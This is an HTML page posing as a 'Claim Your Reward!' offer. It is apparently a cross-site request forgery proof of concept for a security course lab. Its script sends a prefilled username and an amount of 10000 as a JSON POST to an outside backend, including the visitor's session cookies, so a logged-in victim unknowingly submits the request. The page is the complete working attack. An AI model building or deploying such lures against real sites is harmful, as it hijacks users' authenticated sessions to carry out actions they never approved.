<html>
<body>
  <h1>Claim Your Reward!</h1>
  <p>Fill out the details below:</p>

  <form id="rewardForm">
    <label for="username">Username:</label>
    <input type="text" id="username" value="ljl5837"><br><br>

    <label for="fname">First Name:</label>
    <input type="text" id="fname" value="lks"><br><br>

    <label for="amount">Amount:</label>
    <input type="number" id="amount" value="10000"><br><br>

    <label for="comment">Comment:</label>
    <input type="text" id="comment" value="what's your name"><br><br>

    <button type="button" onclick="submitForm()">Submit</button>
  </form>

  <p id="response"></p> <!-- Placeholder to display the server response -->

  <script>
    function submitForm() {
      const jsonPayload = JSON.stringify({
        username: document.getElementById('username').value,
        fname: document.getElementById('fname').value,
        amount: document.getElementById('amount').value,
        comment: document.getElementById('comment').value,
      });

      fetch('https://cse543.aranjbar.me/backend/tfourtwo', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json' // Ensure proper content type for JSON
        },
        body: jsonPayload,
        credentials: 'include' // Include session cookies
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok ' + response.statusText);
        }
        return response.text(); // Parse response as text
      })
      .then(data => {
        // Display the response data
        document.getElementById('response').innerText = `Response: ${data}`;
      })
      .catch(error => {
        console.error('Error:', error);
        document.getElementById('response').innerText = `Error: ${error.message}`;
      });
    }
  </script>
</body>
</html>
